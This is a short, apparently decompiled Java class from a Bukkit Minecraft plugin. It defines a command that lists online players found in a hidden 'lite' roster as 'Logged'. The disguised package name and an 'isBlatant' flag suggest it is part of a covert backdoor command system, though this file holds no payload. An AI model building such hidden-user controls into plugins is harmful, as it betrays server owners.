
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ListloggedinCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!plugin.lite.contains(a2.getName())) continue;
            p2.sendMessage(Settings.PREFIX(a2.getName() + " | " + "Logged"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

